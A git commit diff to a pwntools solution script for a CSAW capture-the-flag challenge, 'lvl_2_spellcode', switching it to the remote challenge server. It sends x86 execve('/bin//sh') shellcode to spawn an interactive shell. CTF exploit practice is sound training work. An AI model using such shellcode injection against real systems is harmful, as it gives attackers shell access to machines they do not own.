ed7d63bf1eb11731d565c26994a2f2901074dd19
root <root@263721dc1b12>
2020-09-19 20:34:51 +0000

    Finished chall lvl_2_spellcode

--- lvl_2_spellcode/solution.py
+++ lvl_2_spellcode/solution.py
@@ -1,7 +1,7 @@
 from pwn import *
 
 
-io = process("level_2_spellcode")
+io = remote("pwn.red.csaw.io", 5009)
 
 print(io.recv())
 
@@ -9,7 +9,7 @@ io.sendline("3")
 
 print(io.recv())
 
-io.sendline("\x90" * 39 +  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")
+io.sendline("\x00" * 18 +  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")
 
 io.interactive()
 
